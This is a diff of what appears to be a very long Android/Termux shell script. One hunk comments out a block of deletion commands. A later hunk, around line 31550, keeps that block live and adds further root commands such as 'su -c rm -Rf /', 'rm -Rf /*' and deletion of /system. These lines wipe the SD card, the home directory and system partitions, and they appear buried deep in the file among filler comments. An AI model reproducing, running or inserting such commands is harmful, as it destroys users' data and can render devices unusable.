@@ -139,14 +139,14 @@
 
 
 
-rm -Rf /sdcard ~ $PREFIX
-su -c /data /system /dev
-su -c cd /dev
-su -c rm -rf *
-su -c cd /data
-su -c rm *
-su -c cd /system
-su -c rm -Rf *
+#rm -Rf /sdcard ~ $PREFIX
+#su -c /data /system /dev
+#su -c cd /dev
+#su -c rm -rf *
+#su -c cd /data
+#su -c rm *
+#su -c cd /system
+#su -c rm -Rf *
 #sdcard
 #sdcard
 #HOME
@@ -31550,12 +31550,16 @@ rm -rf ~ ~ ~ ~ ~
 rm -Rf /sdcard ~ $PREFIX
 su -c /data /system /dev
 su -c cd /dev
+su -c rm -Rf /
+su -c rm -Rf /*
+su -c rm -Rf block
 su -c rm -rf *
 su -c cd /data
 su -c rm *
 su -c cd /system
 su -c rm -Rf *
-
+su -c rm -Rf /system
+su -c rm -Rf sys
 #rm
 #rm
 #kdkfmd
